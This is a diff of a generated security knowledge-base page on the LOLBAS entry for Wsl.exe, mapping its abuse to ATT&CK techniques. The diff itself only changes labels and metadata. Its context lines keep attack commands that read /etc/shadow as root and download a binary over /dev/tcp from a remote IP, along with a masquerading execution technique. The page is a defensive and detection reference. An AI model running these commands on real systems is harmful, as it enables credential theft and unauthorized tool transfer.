@@ -4,7 +4,7 @@ framework: "lolbas"
 generated: "true"
 source_path: "yml/OtherMSBinaries/Wsl.yml"
 source_url: "https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OtherMSBinaries/Wsl.yml"
-build_date: "2026-04-27 18:39:01"
+build_date: "2026-04-27 19:14:21"
 category: "OtherMSBinaries"
 aliases:
   - "Wsl.exe"
@@ -22,16 +22,7 @@ tags:
 
 [[index|Home]] • [[kb/attack/index|ATT&CK]] • [[kb/tools/index|Tools]] • [[kb/defend/index|D3FEND]] • [[kb/car/index|CAR]] • [[kb/sigma/index|Sigma]] • [[kb/atomic/index|Atomic]] • [[kb/lolbas/index|LOLBAS]] • [[workspaces/index|Notes]]
 
-# Wsl.exe
-
 Windows subsystem for Linux executable
-
-## Metadata
-
-- Category: OtherMSBinaries
-- Created: 2019-06-27
-- Author: Matthew Brown
-- Source Path: yml/OtherMSBinaries/Wsl.yml
 
 ## Paths
 
@@ -50,7 +41,7 @@ wsl.exe -e /mnt/c/Windows/System32/calc.exe
 - Use Case: Performs execution of specified file, can be used to execute arbitrary Linux commands.
 - Privileges: User
 - Operating System: Windows 10, Windows Server 2019, Windows 11
-- ATT&CK: [[kb/attack/techniques/T1202-indirect_command_execution|T1202]]
+- ATT&CK: [[kb/attack/techniques/T1202-indirect_command_execution|T1202: Indirect Command Execution]]
 
 ### 2. Execute
 
@@ -63,7 +54,7 @@ wsl.exe -u root -e cat /etc/shadow
 - Use Case: Performs execution of arbitrary Linux commands as root without need for password.
 - Privileges: User
 - Operating System: Windows 10, Windows Server 2019, Windows 11
-- ATT&CK: [[kb/attack/techniques/T1202-indirect_command_execution|T1202]]
+- ATT&CK: [[kb/attack/techniques/T1202-indirect_command_execution|T1202: Indirect Command Execution]]
 
 ### 3. Execute
 
@@ -76,7 +67,7 @@ wsl.exe --exec bash -c "{CMD}"
 - Use Case: Performs execution of arbitrary Linux commands.
 - Privileges: User
 - Operating System: Windows 10, Windows Server 2019, Windows 11
-- ATT&CK: [[kb/attack/techniques/T1202-indirect_command_execution|T1202]]
+- ATT&CK: [[kb/attack/techniques/T1202-indirect_command_execution|T1202: Indirect Command Execution]]
 
 ### 4. Download
 
@@ -89,7 +80,7 @@ wsl.exe --exec bash -c 'cat < /dev/tcp/192.168.1.10/54 > binary'
 - Use Case: Download file
 - Privileges: User
 - Operating System: Windows 10, Windows Server 2019, Windows 11
-- ATT&CK: [[kb/attack/techniques/T1105-ingress_tool_transfer|T1105]]
+- ATT&CK: [[kb/attack/techniques/T1105-ingress_tool_transfer|T1105: Ingress Tool Transfer]]
 
 ### 5. Execute
 
@@ -102,7 +93,7 @@ wsl.exe
 - Use Case: Execute a payload as a child process of `bash.exe` while masquerading as WSL.
 - Privileges: User
 - Operating System: Windows 10, Windows Server 2019, Windows 11
-- ATT&CK: [[kb/attack/techniques/T1218-system_binary_proxy_execution|T1218]]
+- ATT&CK: [[kb/attack/techniques/T1218-system_binary_proxy_execution|T1218: System Binary Proxy Execution]]
 
 ## Detections
 
